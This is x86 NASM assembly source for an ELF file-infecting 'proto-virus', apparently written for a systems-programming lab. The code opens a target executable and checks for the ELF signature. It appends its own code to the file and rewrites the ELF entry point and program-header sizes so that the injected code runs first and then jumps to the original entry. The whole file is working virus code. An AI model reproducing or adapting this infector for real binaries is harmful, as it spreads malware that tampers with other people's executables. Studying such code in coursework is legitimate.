%macro	syscall1 2
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro	syscall3 4
    mov	edx, %4
    mov	ecx, %3
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro  exit 1
    syscall1 1, %1
%endmacro

%macro  write 3
    syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
    syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
    syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
    syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
    syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define STDOUT	1

%define FILE_START_ADDR 0x08048000
%define EHDR_size	52
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

    global _start

section .text

virus_start:
get_my_loc:
    call    anchor
anchor:
    pop     edx
    mov		[ebp - 4], edx
    ret

_start:
    push	ebp
    mov		ebp, esp
    sub		esp, STK_RES               ; Set up ebp and reserve space on the stack for local storage

print_msg:
    call 	get_my_loc
    add		dword [ebp - 4], (OutStr - anchor)
    write	STDOUT, [ebp - 4], OutStrLen
    cmp		eax, 0
    jle		FailExit

open_file:
    call	get_my_loc
    add		dword [ebp - 4], (FileName - anchor)
    open	[ebp - 4], RDWR, 0
    cmp		eax, 0
    jle		FailExit
    mov		[ebp - 8], eax

read_file:
    call 	get_my_loc
    mov		eax, ebp
    sub		eax, 4
    read	[ebp - 8], eax, 4
    cmp		eax, 0
    jle		FailExit

check_elf:
    mov		eax, ebp
    sub		eax, 4
    cmp		byte [eax], 0x7F
    jne		FailExit
    cmp		byte [eax + 1], "E"
    jne		FailExit
    cmp		byte [eax + 2], "L"
    jne		FailExit
    cmp		byte [eax + 3], "F"
    jne		FailExit

infect_file:
    lseek	[ebp - 8], 0, SEEK_END
    cmp		eax, 0
    jl		FailExit
    mov		[ebp - 12], eax
    call	get_my_loc
    add		dword [ebp - 4], (virus_start - anchor)
    write	[ebp - 8], [ebp - 4], (virus_end - virus_start)
    cmp		eax, 0
    jle		FailExit

load_Ehdr:
    lseek	[ebp - 8], 0, SEEK_SET
    cmp		eax, 0
    jl		FailExit
    mov		eax, ebp
    sub		eax, (20 + EHDR_size)
    read	[ebp - 8], eax, EHDR_size
    cmp		eax, 0
    jle		FailExit

save_prev_entry:
    lseek   [ebp - 8], -4, SEEK_END
    cmp     eax, 0
    jl      FailExit
    mov		eax, ebp                   ; get a pointer to the header
    sub		eax, ((20 + EHDR_size) - ENTRY)
    write   [ebp - 8], eax, 4
    cmp		eax, 0
    jle		FailExit

load_PHDRs:
    .get_offset:
    mov     eax, ebp                ; get the ptr to the phdr offset
    sub     eax, ((20 + EHDR_size) - PHDR_start)
    mov     ecx, [eax]              ; save the offset on the stack
    mov     [ebp - 16], ecx
    add     dword [ebp - 16], PHDR_size

    .read_PHDRs:
    lseek   [ebp - 8], [ebp - 16], SEEK_SET
    cmp		eax, 0
    jl		FailExit
    mov     eax, ebp
    sub     eax, (20 + EHDR_size + PHDR_size)
    read    [ebp - 8], eax, PHDR_size
    cmp		eax, 0
    jle		FailExit

save_segment_start_addr:
    mov     eax, ebp
    sub     eax, (20 + EHDR_size + PHDR_size)
    mov     ecx, [eax + PHDR_vaddr]
    sub     ecx, [eax + PHDR_offset]
    mov     [ebp - 20], ecx

modify_entry:
    mov		eax, ebp                   ; get a pointer to the header
    sub		eax, (20 + EHDR_size)
    mov     ecx, [ebp - 20]            ; get the new adress into ecx
    add		ecx, [ebp - 12]
    add		ecx, (_start - virus_start)
    mov		dword [eax + ENTRY], ecx   ; write the adress into the header

overload_Ehdr:
    lseek	[ebp - 8], 0, SEEK_SET
    cmp		eax, 0
    jl		FailExit
    mov		eax, ebp
    sub		eax, (20 + EHDR_size)
    write	[ebp - 8], eax, EHDR_size
    cmp		eax, 0
    jle		FailExit

modify_file_size:
    mov     eax, ebp
    sub     eax, (20 + EHDR_size + PHDR_size)
    mov     ebx, [eax + PHDR_offset]
    mov     ecx, [ebp - 12]
    add     ecx, (virus_end - virus_start)
    sub     ecx, ebx
    mov     [eax + PHDR_filesize], ecx
    mov     [eax + PHDR_memsize], ecx

overload_PHDRs:
    lseek   [ebp - 8], [ebp - 16], SEEK_SET
    cmp		eax, 0
    jl		FailExit
    mov		eax, ebp
    sub		eax, (20 + EHDR_size + PHDR_size)
    write	[ebp - 8], eax, PHDR_size
    cmp		eax, 0
    jle		FailExit

close_file:
    close 	[ebp - 8]
    cmp		eax, -1
    je		FailExit

run_program:
    call    get_my_loc
    add     dword [ebp - 4], (PreviousEntryPoint - anchor)
    mov     eax, [ebp - 4]
    jmp    [eax]

VirusExit:
    exit 0                          ; Termination if all is OK and no previous code to jump to
                                    ; (also an example for use of above macros)
FailExit:
    mov     [ebp - 8], eax
    call	get_my_loc
    add		dword [ebp - 4], (FailStr - anchor)
    write	STDOUT, [ebp - 4], FailStrLen
    exit [ebp - 8]

FileName:	db "ELFexec", 0
FileNameLen equ $ - FileName - 1

OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStrLen equ $ - OutStr - 1

FailStr:        db "perhaps not", 10 , 0
FailStrLen equ $ - FailStr - 1

PreviousEntryPoint: dd VirusExit
virus_end: